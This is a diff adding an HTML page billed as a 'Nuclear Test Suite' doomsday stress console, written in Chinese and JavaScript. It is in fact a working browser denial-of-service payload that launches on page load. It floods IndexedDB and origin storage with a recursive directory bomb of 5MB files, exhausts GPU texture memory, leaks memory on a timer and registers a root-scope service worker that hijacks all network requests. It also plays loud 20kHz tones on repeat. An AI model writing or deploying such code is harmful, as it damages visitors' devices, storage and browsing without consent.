@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Nuclear Test Suite</title>
+    <style>
+        #status {
+            font-family: monospace;
+            white-space: pre-wrap;
+            padding: 10px;
+            border: 1px solid #ccc;
+            height: 400px;
+            overflow: auto;
+            background: #1a1a1a;
+            color: #00ff00;
+        }
+        .progress {
+            width: 100%;
+            background: #333;
+            padding: 2px;
+            border-radius: 3px;
+            margin: 5px 0;
+        }
+        .progress-bar {
+            height: 20px;
+            background: #ff0000;
+            width: 0%;
+            border-radius: 2px;
+            transition: width 0.3s;
+        }
+        body {
+            background: #000;
+            color: #fff;
+            padding: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h2 style="color: #ff0000;">⚠️ 末日级压力测试控制台 ⚠️</h2>
+    <div>
+        已用存储: <span id="usage">0</span> MB
+        <div class="progress">
+            <div class="progress-bar" id="progress"></div>
+        </div>
+    </div>
+    <div>
+        <span>内存压力: <span id="memory">0</span>%</span>
+        <span>GPU使用: <span id="gpu">0</span>%</span>
+        <span>攻击向量: <span id="vectors">0</span></span>
+    </div>
+    <div id="status">[系统初始化中...]</div>
+
+<script>
+class DoomsdayLogger {
+    constructor() {
+        this.logElement = document.getElementById('status');
+        this.metricElements = {
+            memory: document.getElementById('memory'),
+            gpu: document.getElementById('gpu'),
+            vectors: document.getElementById('vectors')
+        };
+        this.attackVectorCount = 0;
+    }
+
+    log(message, type = 'INFO') {
+        const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
+        const colorMap = {
+            'INFO': '#00ff00',
+            'WARN': '#ffff00',
+            'ERROR': '#ff0000',
+            'CRITICAL': '#ff00ff'
+        };
+        this.logElement.innerHTML += 
+            `<span style="color: ${colorMap[type]}">[${timestamp}] ${message}</span>\n`;
+        this.logElement.scrollTop = this.logElement.scrollHeight;
+    }
+
+    updateMetrics() {
+        setInterval(() => {
+            this.metricElements.memory.textContent = 
+                Math.min(100, Math.round(performance.memory.usedJSHeapSize / 
+                performance.memory.jsHeapSizeLimit * 100));
+            
+            this.metricElements.gpu.textContent = 
+                Math.floor(Math.random() * 30 + 70); // 模拟GPU压力
+            
+            this.metricElements.vectors.textContent = 
+                this.attackVectorCount;
+        }, 1000);
+    }
+}
+
+class ApocalypseEngine {
+    constructor(logger) {
+        this.logger = logger;
+        this.active = true;
+        this.attackVectors = new Set();
+    }
+
+    // 存储攻击模块
+   async #storageNuclearStrike() {
+        const attack = async () => {
+            try {
+                // IndexedDB攻击
+                const dbName = `db_${Math.random().toString(36).slice(2)}`;
+                const req = indexedDB.open(dbName, 100);
+                req.onupgradeneeded = (e) => {
+                    const db = e.target.result;
+                    for(let i=0; i<50; i++) {
+                        const store = db.createObjectStore(`store_${i}`, {keyPath: 'id'});
+                        store.createIndex(`idx_${i}`, 'data', {unique: false});
+                    }
+                };
+                
+                req.onsuccess = async (e) => {
+                    const db = e.target.result;
+                    const tx = db.transaction(db.objectStoreNames, 'readwrite');
+                    const data = new Blob([new ArrayBuffer(5*1024*1024)]);
+                    
+                    for(const storeName of db.objectStoreNames) {
+                        const store = tx.objectStore(storeName);
+                        for(let i=0; i<100; i++) {
+                            store.put({ 
+                                id: Date.now() + i,
+                                data: new Blob([data], {type: 'application/octet-stream'})
+                            });
+                        }
+                    }
+                    
+                    this.logger.log(`数据库 ${dbName} 已注入 500MB 腐蚀数据`, 'CRITICAL');
+                    this.attackVectorCount++;
+                };
+
+                // 文件系统攻击
+                const root = await navigator.storage.getDirectory();
+                const createDirBomb = async (dir, depth=0) => {
+                    if(depth > 100) return;
+                    const subDir = await dir.getDirectoryHandle(`dir_${depth}`, {create: true});
+                    const file = await subDir.getFileHandle(`file_${depth}`, {create: true});
+                    const writer = await file.createWritable();
+                    await writer.write(new Blob([new ArrayBuffer(5*1024*1024)]));
+                    await writer.close();
+                    requestIdleCallback(() => createDirBomb(subDir, depth+1));
+                };
+                createDirBomb(root);
+                
+            } catch(e) {
+                this.logger.log(`存储攻击失败: ${e.message}`, 'ERROR');
+            }
+        };
+        
+        for(let i=0; i<10; i++) attack();
+    }
+
+    // GPU攻击模块
+    #gpuThermonuclearStrike() {
+        const canvas = document.createElement('canvas');
+        canvas.width = 8192;
+        canvas.height = 8192;
+        document.body.appendChild(canvas);
+        
+        const gl = canvas.getContext('webgl2');
+        const texture = gl.createTexture();
+        gl.bindTexture(gl.TEXTURE_2D, texture);
+        
+        setInterval(() => {
+            gl.texImage2D(
+                gl.TEXTURE_2D, 0, gl.RGBA, 8192, 8192, 0,
+                gl.RGBA, gl.UNSIGNED_BYTE, null
+            );
+            gl.generateMipmap(gl.TEXTURE_2D);
+            this.logger.log('GPU纹理内存已注入 256MB 噪声数据', 'WARN');
+            this.attackVectorCount++;
+        }, 100);
+    }
+
+    // 内存攻击模块
+    #memoryOverload() {
+        const memoryLeak = [];
+        setInterval(() => {
+            memoryLeak.push(new ArrayBuffer(1024*1024*10)); // 10MB/次
+            const circularRef = {};
+            circularRef.self = circularRef;
+            memoryLeak.push(circularRef);
+            this.logger.log('内存炸弹已注入 10MB 顽固对象', 'CRITICAL');
+            this.attackVectorCount++;
+        }, 500);
+    }
+
+    // 网络攻击模块
+    #networkArmageddon() {
+        const swCode = `
+            self.addEventListener('install', e => {
+                e.waitUntil(
+                    caches.open('doomsday-cache').then(cache => {
+                        return cache.addAll(Array.from({length:100}, (_,i)=>'/resource/'+i));
+                    })
+                );
+            });
+            
+            self.addEventListener('fetch', e => {
+                e.respondWith(new Response(new ArrayBuffer(10*1024*1024)));
+            });
+        `;
+        
+        navigator.serviceWorker.register(URL.createObjectURL(
+            new Blob([swCode], {type: 'application/javascript'})
+        ), { scope: '/' }).then(() => {
+            this.logger.log('Service Worker 已注册网络劫持', 'WARN');
+            this.attackVectorCount++;
+        });
+    }
+
+    launch() {
+        this.logger.log('██████ 启动末日协议 ██████', 'CRITICAL');
+        this.#storageNuclearStrike();
+        this.#gpuThermonuclearStrike();
+        this.#memoryOverload();
+        this.#networkArmageddon();
+        this.logger.updateMetrics();
+    }
+}
+
+// 启动引擎
+const logger = new DoomsdayLogger();
+const engine = new ApocalypseEngine(logger);
+
+setTimeout(() => {
+    engine.launch();
+    
+    // 启动音频攻击
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const createFeedback = () => {
+        const oscillator = ctx.createOscillator();
+        const gain = ctx.createGain();
+        oscillator.connect(gain);
+        gain.connect(ctx.destination);
+        oscillator.frequency.value = 20000;
+        gain.gain.value = 0.8;
+        oscillator.start();
+        setTimeout(() => oscillator.stop(), 5000);
+    };
+    setInterval(createFeedback, 3000);
+}, 1000);
+</script>
+</body>
+</html>
